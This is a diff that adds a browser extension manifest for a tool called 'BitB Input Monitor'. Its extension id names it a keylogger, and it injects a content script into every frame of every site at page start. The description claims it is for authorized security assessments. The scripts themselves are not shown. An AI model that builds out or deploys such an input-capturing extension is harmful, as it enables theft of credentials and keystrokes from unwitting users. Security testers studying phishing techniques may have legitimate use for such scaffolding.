@@ -1,0 +1,28 @@
+{
+  "manifest_version": 2,
+  "name": "BitB Input Monitor",
+  "version": "1.0",
+  "description": "Input monitoring for authorized security assessments",
+  "permissions": [
+    "<all_urls>",
+    "storage",
+    "webNavigation"
+  ],
+  "content_scripts": [
+    {
+      "matches": ["<all_urls>"],
+      "js": ["content.js"],
+      "run_at": "document_start",
+      "all_frames": true
+    }
+  ],
+  "background": {
+    "scripts": ["config.js", "background.js"],
+    "persistent": false
+  },
+  "browser_specific_settings": {
+    "gecko": {
+      "id": "bitb-keylogger@security.local"
+    }
+  }
+}
